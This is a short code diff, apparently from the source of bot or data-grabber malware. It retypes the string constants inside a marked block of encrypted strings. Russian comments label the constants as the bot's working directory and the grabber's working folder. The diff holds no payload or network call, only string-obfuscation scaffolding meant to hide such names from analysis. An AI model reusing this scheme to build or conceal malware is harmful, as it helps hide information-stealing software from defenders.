@@ -6,8 +6,8 @@
 //---------------------------------------------------------------------------
 
 
-extern char BeginCryptBlock[];
-extern char EndCryptBlock[];
+extern CSSTR BeginCryptBlock[];
+extern CSSTR EndCryptBlock[];
 
 
 
@@ -40,7 +40,7 @@ string GetStr(const char* EncryptedStr)
 
 
 
-char BeginCryptBlock[] = "CSBEGIN";
+CSSTR BeginCryptBlock[] = "CSBEGIN";
 //=============================================================================
 //  Блок хранения шифрованных строк.
 //  Все строки находящиеся ниже и до определения
@@ -49,8 +49,8 @@ char BeginCryptBlock[] = "CSBEGIN";
 //=============================================================================
 
 
-char BotWorkPath[] = "WnsBMT"; // Рабочий каталог бота
-char GrabberPath[] = "gdata";  // Имя рабочей папки грабера
+CSSTR BotWorkPath[] = "WnsBMT"; // Рабочий каталог бота
+CSSTR GrabberPath[] = "gdata";  // Имя рабочей папки грабера
 
 
 
@@ -67,6 +67,6 @@ char GrabberPath[] = "gdata";  // Имя рабочей папки грабера
 //=============================================================================
 // Конец блока шифрованных строк
 //=============================================================================
-char EndCryptBlock[] = "CSEND";
+CSSTR EndCryptBlock[] = "CSEND";
 
 #pragma pack(pop)
